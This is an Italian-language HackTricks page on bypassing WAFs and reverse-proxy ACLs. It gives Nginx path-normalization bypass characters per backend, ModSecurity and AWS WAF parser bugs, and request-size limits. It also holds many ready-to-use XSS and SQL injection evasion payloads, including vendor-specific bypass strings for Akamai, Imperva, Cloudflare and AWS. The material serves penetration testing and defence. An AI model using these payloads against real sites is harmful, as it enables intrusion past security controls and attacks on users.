# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Tecniche [da questa ricerca](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Esempio di regola Nginx:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Per prevenire bypass, Nginx esegue la normalizzazione del percorso prima di controllarlo. Tuttavia, se il server backend esegue una normalizzazione diversa (rimuovendo caratteri che nginx non rimuove), potrebbe essere possibile bypassare questa difesa.

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Configurazione Nginx FPM:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx è configurato per bloccare l'accesso a `/admin.php`, ma è possibile aggirarlo accedendo a `/admin.php/index.php`.

### Come prevenire
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**In questo post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) si spiega che ModSecurity v3 (fino alla 3.0.12), **ha implementato in modo errato la variabile `REQUEST_FILENAME`** che doveva contenere il percorso accessibile (fino all'inizio dei parametri). Questo perché eseguiva un URL decode per ottenere il percorso.\
Pertanto, una richiesta come `http://example.com/foo%3f';alert(1);foo=` in mod security supporrà che il percorso sia solo `/foo` perché `%3f` viene trasformato in `?` che termina il percorso URL, ma in realtà il percorso che un server riceverà sarà `/foo%3f';alert(1);foo=`.

Le variabili `REQUEST_BASENAME` e `PATH_INFO` sono state anch'esse influenzate da questo bug.

Qualcosa di simile è accaduto nella versione 2 di Mod Security che ha permesso di bypassare una protezione che impediva all'utente di accedere a file con estensioni specifiche relative a file di backup (come `.bak`) semplicemente inviando il punto codificato in URL come `%2e`, per esempio: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[Questa ricerca](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) menziona che era possibile bypassare le regole AWS WAF applicate sugli header HTTP inviando un header "malformato" che non veniva correttamente analizzato da AWS ma lo era dal server backend.

Ad esempio, inviando la seguente richiesta con un'iniezione SQL nell'header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
È stato possibile bypassare AWS WAF perché non comprendeva che la riga successiva fa parte del valore dell'intestazione mentre il server NODEJS lo faceva (questo è stato risolto).

## Bypass generici del WAF

### Limiti di dimensione della richiesta

Comunemente i WAF hanno un certo limite di lunghezza delle richieste da controllare e se una richiesta POST/PUT/PATCH supera tale limite, il WAF non controllerà la richiesta.

- Per AWS WAF, puoi [**controllare la documentazione**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Dimensione massima di un corpo di richiesta web che può essere ispezionato per le protezioni di Application Load Balancer e AWS AppSync</td><td>8 KB</td></tr><tr><td>Dimensione massima di un corpo di richiesta web che può essere ispezionato per le protezioni di CloudFront, API Gateway, Amazon Cognito, App Runner e Verified Access**</td><td>64 KB</td></tr></tbody></table>

- Da [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

I firewall per applicazioni web più vecchi con Core Rule Set 3.1 (o inferiore) consentono messaggi più grandi di **128 KB** disattivando l'ispezione del corpo della richiesta, ma questi messaggi non verranno controllati per vulnerabilità. Per le versioni più recenti (Core Rule Set 3.2 o più recenti), lo stesso può essere fatto disabilitando il limite massimo del corpo della richiesta. Quando una richiesta supera il limite di dimensione:

Se **modalità di prevenzione**: Registra e blocca la richiesta.\
Se **modalità di rilevamento**: Ispeziona fino al limite, ignora il resto e registra se il `Content-Length` supera il limite.

- Da [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Per impostazione predefinita, il WAF ispeziona solo i primi 8KB di una richiesta. Può aumentare il limite fino a 128KB aggiungendo Metadati Avanzati.

- Da [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Fino a 128KB.

### Offuscamento <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Compatibilità Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

A seconda dell'implementazione della normalizzazione Unicode (maggiori informazioni [qui](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), i caratteri che condividono la compatibilità Unicode potrebbero essere in grado di bypassare il WAF ed eseguire il payload previsto. I caratteri compatibili possono essere trovati [qui](https://www.compart.com/en/unicode).

#### Esempio <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a>

Come menzionato in [**questo post del blog**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), per bypassare i WAF in grado di mantenere un contesto dell'input dell'utente, potremmo abusare delle tecniche WAF per normalizzare effettivamente l'input degli utenti.

Ad esempio, nel post si menziona che **Akamai ha decodificato un input utente 10 volte**. Pertanto, qualcosa come `<input/%2525252525252525253e/onfocus` sarà visto da Akamai come `<input/>/onfocus` che **potrebbe pensare che vada bene poiché il tag è chiuso**. Tuttavia, finché l'applicazione non decodifica l'input 10 volte, la vittima vedrà qualcosa come `<input/%25252525252525253e/onfocus` che è **ancora valido per un attacco XSS**.

Pertanto, questo consente di **nascondere payload in componenti codificati** che il WAF decodificherà e interpreterà mentre la vittima no.

Inoltre, questo può essere fatto non solo con payload codificati in URL, ma anche con altre codifiche come unicode, esadecimale, ottale...

Nel post vengono suggeriti i seguenti bypass finali:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Si menziona anche che a seconda di **come alcuni WAF comprendono il contesto** dell'input dell'utente, potrebbe essere possibile abusarne. L'esempio proposto nel blog è che Akamai consente(va) di mettere qualsiasi cosa tra `/*` e `*/` (potenzialmente perché questo è comunemente usato come commenti). Pertanto, una SQL injection come `/*'or sleep(5)-- -*/` non verrà catturata e sarà valida poiché `/*` è la stringa iniziale dell'iniezione e `*/` è commentato.

Questi tipi di problemi di contesto possono essere utilizzati anche per **abusare di altre vulnerabilità rispetto a quella prevista** per essere sfruttata dal WAF (ad esempio, questo potrebbe essere utilizzato anche per sfruttare un XSS).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Genera un URL di gateway API da utilizzare con ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Simile a fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Plugin di Burp Suite che utilizza IP di gateway API
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Un numero determinato dinamicamente di istanze di container vengono attivate in base alla dimensione del file di input e al fattore di suddivisione, con l'input suddiviso in blocchi per l'esecuzione parallela, come 100 istanze che elaborano 100 blocchi da un file di input di 10.000 righe con un fattore di suddivisione di 100 righe.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Possono essere utilizzate diverse tecniche per bypassare i filtri regex sui firewall. Esempi includono l'alternanza di maiuscole e minuscole, l'aggiunta di interruzioni di riga e la codifica dei payload. Risorse per i vari bypass possono essere trovate su [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) e [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Gli esempi seguenti sono stati estratti da [questo articolo](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Strumenti

- [**nowafpls**](https://github.com/assetnote/nowafpls): plugin di Burp per aggiungere dati spazzatura alle richieste per bypassare i WAF per lunghezza

## Riferimenti

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)


{{#include ../banners/hacktricks-training.md}}
